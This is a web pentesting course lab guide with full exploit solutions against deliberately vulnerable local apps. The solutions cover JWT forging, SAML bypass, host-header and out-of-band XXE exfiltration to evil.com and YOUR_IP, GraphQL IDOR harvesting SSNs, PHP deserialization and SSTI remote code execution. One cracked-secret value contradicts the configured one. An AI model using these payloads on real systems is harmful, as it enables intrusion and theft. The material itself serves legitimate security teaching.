# Lab Exercises Guide - Complete Reference

This document provides comprehensive lab setup instructions, exercises, and solutions for all training days.

---

## Lab Environment Setup

### Docker Compose Infrastructure

```yaml
version: '3.8'

services:
  # Day 1: Authentication Labs
  auth-vulnerable-app:
    build: ./lab-apps/day1-auth
    ports:
      - "8001:80"
    environment:
      - JWT_SECRET=weak-secret-123
      - ENABLE_SAML=true
      - ENABLE_OAUTH=true

  # Day 2: Password Reset & Business Logic
  ecommerce-app:
    build: ./lab-apps/day2-ecommerce
    ports:
      - "8002:80"
    depends_on:
      - redis
      - postgres
    environment:
      - REDIS_URL=redis://redis:6379
      - DB_URL=postgresql://user:pass@postgres:5432/ecommerce

  # Day 3: API & XXE
  api-server:
    build: ./lab-apps/day3-api
    ports:
      - "8003:80"
      - "50051:50051"  # gRPC port
    environment:
      - ENABLE_GRAPHQL=true
      - XXE_VULNERABLE=true

  # Day 4: Crypto & RCE
  crypto-app:
    build: ./lab-apps/day4-crypto
    ports:
      - "8004:80"
    environment:
      - ENCRYPTION_KEY=known-key-for-testing

  # Day 5: Capstone
  capstone-app:
    build: ./lab-apps/day5-capstone
    ports:
      - "8005:80"

  # Supporting Services
  redis:
    image: redis:alpine
    ports:
      - "6379:6379"

  postgres:
    image: postgres:13
    environment:
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=pass
      - POSTGRES_DB=ecommerce
    ports:
      - "5432:5432"

  mailcatcher:
    image: sj26/mailcatcher
    ports:
      - "1080:1080"  # Web interface
      - "1025:1025"  # SMTP port
```

### Quick Start

```bash
# Clone lab repository
git clone https://github.com/webapp-training/labs.git
cd labs

# Start all lab environments
docker-compose up -d

# Verify services
docker-compose ps

# Access labs
# Day 1: http://localhost:8001
# Day 2: http://localhost:8002
# Day 3: http://localhost:8003
# Day 4: http://localhost:8004
# Day 5: http://localhost:8005

# View emails (password reset, etc)
# http://localhost:1080
```

---

## Day 1 Labs - Detailed Solutions

### Lab 1: JWT Exploitation

**Objective:** Exploit weak JWT implementation to gain admin access

**Setup:**
```bash
# Login as regular user
curl -X POST http://localhost:8001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password123"}' \
  -v | grep -i authorization
```

**Solution Steps:**

**Step 1: Capture and Decode JWT**
```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJyb2xlIjoidXNlciIsImV4cCI6MTY5OTk5OTk5OX0.signature"

# Decode header and payload
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VyX2lkIjoxLCJyb2xlIjoidXNlciIsImV4cCI6MTY5OTk5OTk5OX0" | base64 -d
# {"user_id":1,"role":"user","exp":1699999999}
```

**Step 2: Test "none" Algorithm**
```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool

# Test all attacks
python3 jwt_tool.py $TOKEN -M at

# If "none" algorithm works, you'll see successful bypass
```

**Step 3: Brute-Force Secret**
```bash
# Create wordlist with common secrets
cat > secrets.txt << EOF
secret
weak-secret-123
password
123456
admin
EOF

# Crack the secret
python3 jwt_tool.py $TOKEN -C -d secrets.txt

# Expected output:
# [+] secret123 is the CORRECT key!
```

**Step 4: Forge Admin Token**
```bash
# Modify claims
python3 jwt_tool.py $TOKEN -T

# In the interactive menu:
# 1. Change "role" from "user" to "admin"
# 2. Sign with cracked secret: secret123

# Alternative: Manual forging
cat > payload.json << EOF
{
  "user_id": 1,
  "role": "admin",
  "exp": 9999999999
}
EOF

python3 jwt_tool.py -S hs256 -p "secret123" -pc role -pv admin $TOKEN
```

**Step 5: Access Admin Panel**
```bash
ADMIN_TOKEN="<forged_token>"

curl http://localhost:8001/api/admin/users \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# Expected: List of all users (admin access confirmed!)
```

**Flags to Capture:**
- User JWT secret: `weak-secret-123`
- Admin panel flag: `FLAG{jwt_none_algorithm_pwned}`

---

### Lab 2: SAML Signature Bypass

**Objective:** Bypass SAML signature validation

**Solution:**

```python
#!/usr/bin/env python3

import base64
import zlib
from lxml import etree

# Intercept SAMLResponse from Burp
saml_b64 = "PHNhbWxwOlJlc3BvbnNlPi4uLjwvc2FtbHA6UmVzcG9uc2U+"

# Decode
saml_xml = base64.b64decode(saml_b64)

# Inflate if compressed
try:
    saml_xml = zlib.decompress(saml_xml, -zlib.MAX_WBITS)
except:
    pass

# Parse XML
doc = etree.fromstring(saml_xml)

# Remove signature
signature = doc.find('.//{http://www.w3.org/2000/09/xmldsig#}Signature')
if signature is not None:
    signature.getparent().remove(signature)

# Modify attributes
nameid = doc.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}NameID')
nameid.text = 'admin@example.com'

role_attr = doc.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Attribute[@Name="role"]')
role_value = role_attr.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue')
role_value.text = 'admin'

# Re-serialize
modified_xml = etree.tostring(doc)

# Re-encode
modified_b64 = base64.b64encode(modified_xml).decode()

print("Modified SAMLResponse:")
print(modified_b64)
print("\nPaste this into Burp and forward the request")
```

---

## Day 2 Labs - Detailed Solutions

### Lab 3: Password Reset Exploitation

**Attack 1: Host Header Injection**

```bash
# Step 1: Setup listener
python3 -m http.server 8080

# Step 2: Send malicious reset request
curl -X POST http://localhost:8002/api/password-reset \
  -H "Host: evil.com:8080" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@lab.local"}'

# Step 3: Check mailcatcher
# Open http://localhost:1080
# Reset link should point to: http://evil.com:8080/reset?token=...

# Step 4: Victim clicks link → token sent to attacker
# Check python http.server logs for token
```

**Attack 2: Rate Limit Bypass**

```python
#!/usr/bin/env python3

import requests
import concurrent.futures

def send_reset(ip):
    headers = {'X-Forwarded-For': f'10.0.{ip // 256}.{ip % 256}'}
    response = requests.post(
        'http://localhost:8002/api/password-reset',
        headers=headers,
        json={'email': 'victim@lab.local'}
    )
    return response.status_code

# Send 100 requests with different IPs
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    results = list(executor.map(send_reset, range(100)))

success_count = sum(1 for status in results if status == 200)
print(f"Successful requests: {success_count}/100")
```

### Lab 4: Race Condition Exploitation

**Scenario:** Redeem $50 discount coupon multiple times

**Solution:**

```python
#!/usr/bin/env python3

import requests
import concurrent.futures
import json

# Step 1: Login
session = requests.Session()
login_response = session.post(
    'http://localhost:8002/api/login',
    json={'username': 'buyer1@lab.local', 'password': 'password123'}
)

print("Initial balance:")
balance = session.get('http://localhost:8002/api/balance')
print(balance.json())

# Step 2: Define attack function
def redeem_coupon():
    try:
        response = session.post(
            'http://localhost:8002/api/redeem-coupon',
            json={'code': 'SAVE50'},
            timeout=5
        )
        return {
            'status': response.status_code,
            'body': response.text
        }
    except Exception as e:
        return {'status': 'error', 'body': str(e)}

# Step 3: Execute race condition attack
print("\n[*] Executing race condition attack...")
print("[*] Sending 50 parallel coupon redemption requests...")

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(redeem_coupon) for _ in range(50)]

    results = []
    for future in concurrent.futures.as_completed(futures):
        results.append(future.result())

# Step 4: Analyze results
success_count = sum(1 for r in results if r['status'] == 200)
print(f"\n[+] Successful redemptions: {success_count}")

# Step 5: Check final balance
print("\nFinal balance:")
balance = session.get('http://localhost:8002/api/balance')
final = balance.json()
print(final)

# Calculate gain
print(f"\n[+] Total discounts applied: ${success_count * 50}")
print(f"[+] Race condition exploitation successful!")

# Expected: 20+ successful redemptions instead of 1
```

---

## Day 3 Labs - Detailed Solutions

### Lab 5: GraphQL Exploitation

**Attack 1: Schema Introspection**

```bash
# Full introspection query
curl -X POST http://localhost:8003/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema { types { name fields { name type { name } } } } }"
  }' | jq > schema.json

# Discover hidden fields
cat schema.json | jq '.data.__schema.types[] | select(.name=="User") | .fields[].name'

# Expected output:
# id
# username
# email
# isAdmin          ← Hidden field!
# ssn              ← Hidden field!
# credit_card      ← Hidden field!
```

**Attack 2: Batch Query IDOR**

```graphql
query BatchIDOR {
  user1: user(id: 1) {
    id
    username
    email
    ssn
    credit_card
  }
  user2: user(id: 2) {
    id
    username
    email
    ssn
    credit_card
  }
  user3: user(id: 3) {
    id
    username
    email
    ssn
    credit_card
  }
  # ... continue for users 1-1000
}
```

**Automated GraphQL Enumeration:**

```python
#!/usr/bin/env python3

import requests
import json

url = 'http://localhost:8003/graphql'

# Generate batch query for 100 users
fields = ['id', 'username', 'email', 'ssn', 'credit_card']
queries = []

for i in range(1, 101):
    alias = f"user{i}"
    field_str = " ".join(fields)
    queries.append(f'{alias}: user(id: {i}) {{ {field_str} }}')

batch_query = "query { " + " ".join(queries) + " }"

response = requests.post(url, json={'query': batch_query})
data = response.json()

# Extract sensitive data
print("Stolen PII:")
for key, value in data['data'].items():
    if value:
        print(f"{value['username']}: SSN={value['ssn']}, CC={value['credit_card']}")
```

### Lab 6: XXE Exploitation

**Attack 1: Basic File Read**

```xml
POST /api/import-xml HTTP/1.1
Host: localhost:8003
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<import>
  <user>&xxe;</user>
</import>
```

**Attack 2: Out-of-Band XXE**

```bash
# Step 1: Setup listener
python3 -m http.server 8080

# Step 2: Create evil.dtd
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8080/?data=%file;'>">
%eval;
%exfil;
EOF

# Step 3: Send XXE payload
curl -X POST http://localhost:8003/api/import-xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://YOUR_IP:8080/evil.dtd">
  %dtd;
]>
<import><user>test</user></import>'

# Step 4: Check listener logs
# You should receive:
# GET /?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo= HTTP/1.1

# Step 5: Decode Base64
echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=" | base64 -d
```

---

## Day 4 Labs - Detailed Solutions

### Lab 7: Padding Oracle Attack

```bash
# Install padbuster
git clone https://github.com/AonCyberLabs/PadBuster
cd PadBuster

# Capture encrypted cookie
COOKIE="U2FsdGVkX1+uIXeALcC4+HZm4f5E3w8BRN7hQz6FZQ0="

# Run padding oracle attack
./padbuster.pl http://localhost:8004/admin \
  "$COOKIE" 16 \
  -cookies "auth=$COOKIE" \
  -encoding 0

# Tool will brute-force each byte using server responses
# Expected: Decrypted value: "user=john;role=user"

# Now forge admin cookie
./padbuster.pl http://localhost:8004/admin \
  "$COOKIE" 16 \
  -cookies "auth=$COOKIE" \
  -encoding 0 \
  -plaintext "user=john;role=admin"

# Use forged cookie to access admin panel
```

### Lab 8: PHP Deserialization RCE

**Vulnerable Code Analysis:**
```php
<?php
// admin.php
$data = unserialize(base64_decode($_COOKIE['user']));
?>
```

**Exploit:**
```php
<?php
// Generate malicious payload

class User {
    public $username;
    public $isAdmin;
    public $command;

    function __destruct() {
        if ($this->isAdmin) {
            system($this->command);  // RCE!
        }
    }
}

$exploit = new User();
$exploit->username = "attacker";
$exploit->isAdmin = true;
$exploit->command = "cat /flag.txt";  // Read flag

$payload = base64_encode(serialize($exploit));
echo "Cookie: user=$payload\n";
?>
```

**Execute:**
```bash
# Generate payload
php exploit.php

# Send request
curl http://localhost:8004/admin \
  -H "Cookie: user=TzoyOiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjg6ImF0dGFja2VyIjtzOjc6ImlzQWRtaW4iO2I6MTtzOjc6ImNvbW1hbmQiO3M6MTU6ImNhdCAvZmxhZy50eHQiO30="

# Expected output: FLAG{php_deserialization_rce}
```

---

## Day 5 Capstone - Attack Path

### Recommended Attack Chain

```
1. Reconnaissance
   ↓
2. Subdomain enumeration → api.capstone.local
   ↓
3. GraphQL introspection → Discover admin mutations
   ↓
4. JWT algorithm confusion → Forge admin token
   ↓
5. Access admin panel → Find file upload feature
   ↓
6. SSTI in filename → Achieve RCE
   ↓
7. Reverse shell → Post-exploitation
   ↓
8. Database access → Extract all user data
   ↓
9. Persistence → Create backdoor account
   ↓
10. Report → Professional documentation
```

### Detailed Exploitation Script

```python
#!/usr/bin/env python3

import requests
import jwt
import json

print("[*] Starting Capstone Exploitation...")

# Step 1: Reconnaissance
print("\n[1] Reconnaissance")
session = requests.Session()

# Step 2: Login as regular user
print("\n[2] Logging in as regular user...")
login = session.post(
    'http://capstone.local/api/login',
    json={'username': 'user1', 'password': 'password123'}
)
token = login.json()['token']
print(f"[+] Got token: {token[:50]}...")

# Step 3: Decode JWT
print("\n[3] Analyzing JWT...")
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"[+] Decoded payload: {json.dumps(decoded, indent=2)}")

# Step 4: Forge admin token (algorithm confusion)
print("\n[4] Forging admin token...")
decoded['role'] = 'admin'
decoded['is_admin'] = True

# Try "none" algorithm
forged_token = jwt.encode(decoded, None, algorithm=None)
print(f"[+] Forged token: {forged_token[:50]}...")

# Step 5: Access admin panel
print("\n[5] Accessing admin panel...")
admin_response = session.get(
    'http://capstone.local/api/admin',
    headers={'Authorization': f'Bearer {forged_token}'}
)

if admin_response.status_code == 200:
    print("[+] Admin access successful!")
    print(f"[+] Response: {admin_response.text[:200]}")
else:
    print(f"[-] Failed: {admin_response.status_code}")

# Step 6: File upload SSTI
print("\n[6] Attempting SSTI via file upload...")
files = {
    'file': ('{{7*7}}.txt', b'test content', 'text/plain')
}
upload = session.post(
    'http://capstone.local/api/upload',
    files=files,
    headers={'Authorization': f'Bearer {forged_token}'}
)

if '49' in upload.text:  # 7*7=49
    print("[+] SSTI confirmed!")

    # RCE payload
    rce_payload = "{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}.txt"
    files = {'file': (rce_payload, b'exploit', 'text/plain')}

    rce = session.post(
        'http://capstone.local/api/upload',
        files=files,
        headers={'Authorization': f'Bearer {forged_token}'}
    )

    print(f"[+] FLAG: {rce.text}")
else:
    print("[-] SSTI not working")

print("\n[*] Exploitation complete!")
```

---

## Common Lab Issues & Troubleshooting

### Issue 1: Docker Containers Not Starting

```bash
# Check logs
docker-compose logs -f

# Rebuild containers
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

### Issue 2: JWT Tool Not Working

```bash
# Ensure Python 3.8+
python3 --version

# Install dependencies
cd jwt_tool
pip3 install -r requirements.txt

# Run with python3 explicitly
python3 jwt_tool.py <token>
```

### Issue 3: Burp Suite Certificate Issues

```bash
# Export Burp CA
# Burp → Proxy → Options → Import/Export CA Certificate

# Firefox
about:preferences#privacy → View Certificates → Import → burp-ca.crt

# Chrome/Chromium
Settings → Privacy → Security → Manage Certificates → Import
```

### Issue 4: Race Condition Not Working

```python
# Increase concurrency
ThreadPoolExecutor(max_workers=100)  # Increase from 50

# Reduce request time
timeout=1  # Faster timeout

# Use asyncio instead
import aiohttp
import asyncio
```

---

## Lab Completion Checklist

### Day 1
- [ ] Burp Suite configured with HTTPS interception
- [ ] JWT decoded and secret cracked
- [ ] Admin token forged successfully
- [ ] SAML signature bypass demonstrated
- [ ] 2FA bypass documented

### Day 2
- [ ] Password reset token intercepted
- [ ] Host header injection working
- [ ] Rate limiting bypassed
- [ ] Mass assignment exploited
- [ ] Race condition successful (10+ redemptions)

### Day 3
- [ ] GraphQL schema enumerated
- [ ] REST API IDOR demonstrated
- [ ] XXE file read successful
- [ ] OOB XXE data exfiltrated
- [ ] gRPC endpoint tested

### Day 4
- [ ] Padding oracle attack completed
- [ ] Hash length extension exploit
- [ ] Deserialization RCE achieved
- [ ] SSTI exploited
- [ ] Git exposure leveraged

### Day 5
- [ ] Full attack chain documented
- [ ] Admin access achieved
- [ ] Sensitive data extracted
- [ ] Professional report written
- [ ] Presentation prepared

---

**End of Lab Guide**
